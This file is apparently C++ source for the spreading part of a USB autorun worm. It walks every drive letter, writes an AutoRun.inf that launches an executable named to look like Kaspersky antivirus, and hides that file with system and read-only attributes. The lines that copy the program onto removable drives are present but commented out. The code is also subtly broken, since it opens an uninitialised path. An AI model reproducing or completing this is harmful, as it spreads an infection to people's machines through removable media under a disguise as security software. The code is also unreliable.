#include <windows.h>
#include <fstream>
#include <iostream>

using namespace std;

const char *drive[]={ 
    "a:", "b:", "c:", "d:", "e:", "f:", "g:", "h:", "i:", "j:", "k:", "l:",
    "m:", "n:", "o:", "p:", "q:", "r:", "s:", "t:", "u:", "v:", "w:", "x:",
    "y:", "z:", 0
};

int FindDrv(const char *drive)
{
    char dirX[MAX_PATH];
    char path[MAX_PATH];
    char autorun[MAX_PATH]="AutoRun.inf";
    ofstream CreAut;
    
    HMODULE GetQ; 
    GetQ=GetModuleHandle(NULL);
    GetModuleFileName(GetQ,path,sizeof(path));

    CreAut.open(dirX,ios_base::out);
    CreAut<<"[AutoRun]"<<endl;
    CreAut<<"open=Kasperrsky.exe"<<endl;
    CreAut<<"shellexecute=Kasperrsky.exe"<<endl;
    CreAut<<"shell\\Auto\\command=Kasperrsky.exe"<<endl;
    CreAut<<"shell=Auto"<<endl;
    CreAut.close();

    SetFileAttributes(dirX,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
    UINT type= GetDriveType(drive);

    if(type == DRIVE_REMOVABLE)
    {
        //strcpy(dirX, drive);
        //strcat(dirX, "\\");
        //strcat(dirX, "Kasperrsky.exe");

        //CopyFile(path,dirX,TRUE); 
        std::cout << "Detected removable" << std::endl;
        //strcpy(dirX, drive);
        //strcat(dirX, "\\" );
        //strcat(dirX, autorun);
        return 0;
    } else {
        std::cout << "Not detected removable" << std::endl;
    }
    return 0;
 
}

int main()
{
    for(int i=0;drive[i];i++)
    {
        FindDrv(drive[i]);
    }
    return 0;
}









